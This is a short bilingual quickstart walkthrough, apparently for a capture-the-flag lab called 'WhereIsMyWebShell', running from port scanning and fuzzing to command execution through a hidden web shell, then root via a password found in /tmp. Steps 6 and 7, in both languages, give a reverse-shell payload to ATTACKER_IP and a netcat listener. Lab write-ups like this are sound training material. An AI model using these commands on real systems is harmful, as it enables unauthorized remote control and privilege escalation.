# 🚀 QuickStart - WhereIsMyWebShell

## English Version
**For a complete guide in English, see [WhereIsMyWebShell-En.md](WhereIsMyWebShell-En.md)**

### Quick Resolution Path
1. Scan ports with `nmap` → Find HTTP on port 80
2. Visit the web page → Look for hints in the page content
3. Fuzz directories with `gobuster` → Find hidden files
4. Fuzz parameters on found files with `ffuz` → Discover the `parameter` parameter
5. Execute commands through: `http://target/shell.php?parameter=whoami`
6. Establish reverse shell: `http://target/shell.php?parameter=bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`
7. Listen on attacker: `nc -lvnp 4444`
8. Explore `/tmp` directory → Find `.secreto.txt`
9. Extract password: `cat /tmp/.secreto.txt`
10. Elevate privileges: `su` with the obtained password
11. **ROOT ACCESS ACHIEVED** ✅

---

## Versión en Español
**Para una guía completa en español, ver [WhereIsMyWebShell.md](WhereIsMyWebShell.md)**

### Ruta Rápida de Resolución
1. Escanea puertos con `nmap` → Encuentra HTTP en puerto 80
2. Visita la página web → Busca pistas en el contenido
3. Fuzea directorios con `gobuster` → Encuentra archivos ocultos
4. Fuzea parámetros en archivos encontrados con `ffuz` → Descubre el parámetro `parameter`
5. Ejecuta comandos mediante: `http://target/shell.php?parameter=whoami`
6. Establece reverse shell: `http://target/shell.php?parameter=bash -i >& /dev/tcp/IP_ATACANTE/4444 0>&1`
7. Escucha en máquina atacante: `nc -lvnp 4444`
8. Explora directorio `/tmp` → Encuentra `.secreto.txt`
9. Extrae contraseña: `cat /tmp/.secreto.txt`
10. Eleva privilegios: `su` con la contraseña obtenida
11. **ACCESO ROOT LOGRADO** ✅

---

## Key Concepts / Conceptos Clave
- **RCE (Remote Code Execution)**: Ejecución remota de comandos
- **Fuzzing**: Técnica para descubrir parámetros y directorios
- **Reverse Shell**: Shell inversa para control total del sistema
- **Privilege Escalation**: Escalada de privilegios para acceso root
